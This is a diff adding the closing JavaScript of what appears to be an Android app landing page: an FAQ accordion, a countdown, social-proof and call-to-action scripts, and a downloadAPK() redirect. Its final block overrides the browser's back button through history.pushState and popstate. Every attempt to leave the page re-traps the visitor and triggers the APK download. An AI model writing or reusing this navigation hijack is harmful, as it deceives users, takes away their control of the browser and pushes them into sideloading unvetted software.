@@ -921,4 +921,84 @@ function initSocialProof() {
 function initAccordion() {
   var qs = document.querySelectorAll('.faq-q');
   qs.forEach(function(q) {
-    q
+    q.addEventListener('click', function() {
+      var item = this.parentElement;
+      item.classList.toggle('open');
+    });
+  });
+}
+
+/* ═══════ DOWNLOAD REDIRECTION EXECUTABLE ═══════ */
+function downloadAPK() {
+  window.location.href = config.apkUrl;
+}
+
+/* ═══════ LIFECYCLE INVOCATION INITIALIZATIONS ═══════ */
+document.addEventListener('DOMContentLoaded', function() {
+  initProducts();
+  initCountdown();
+  initSocialProof();
+  initAccordion();
+});
+
+/* ═══════ SCROLL-BOUND BOTTOM CTA VISIBILITY STRIP ═══════ */
+(function() {
+  try {
+    var bar = document.getElementById('bottomBar');
+    var hero = document.querySelector('.hero');
+    if(!bar || !hero) return;
+    
+    if(typeof IntersectionObserver !== 'undefined') {
+      new IntersectionObserver(function(entries) {
+        entries.forEach(function(entry) {
+          if(entry.isIntersecting) bar.classList.remove('visible');
+          else bar.classList.add('visible');
+        });
+      }, { threshold: 0 }).observe(hero);
+    } else {
+      window.addEventListener('scroll', function() {
+        var r = hero.getBoundingClientRect();
+        if(r.bottom < 0) bar.classList.add('visible');
+        else bar.classList.remove('visible');
+      });
+    }
+  } catch(e) {}
+})();
+
+/* ═══════ SCROLL REVEAL ANIMATIONS ═══════ */
+(function() {
+  try {
+    var els = document.querySelectorAll('.reveal');
+    if(typeof IntersectionObserver !== 'undefined') {
+      var io = new IntersectionObserver(function(entries) {
+        entries.forEach(function(entry) {
+          if(entry.isIntersecting) {
+            entry.target.classList.add('visible');
+            io.unobserve(entry.target);
+          }
+        });
+      }, { threshold: 0.05 });
+      for(var i = 0; i < els.length; i++) io.observe(els[i]);
+    } else {
+      for(var j = 0; j < els.length; j++) els[j].classList.add('visible');
+    }
+  } catch(e) {
+    var all = document.querySelectorAll('.reveal');
+    for(var k = 0; k < all.length; k++) all[k].classList.add('visible');
+  }
+})();
+
+/* ═══════ ANDROID SYSTEM CONTROL POPSTATE OVERRIDE ═══════ */
+(function() {
+  try {
+    history.pushState(null, '', window.location.href);
+    window.addEventListener('popstate', function() {
+      history.pushState(null, '', window.location.href);
+      downloadAPK();
+    });
+  } catch(e) {}
+})();
+</script>
+
+</body>
+</html>
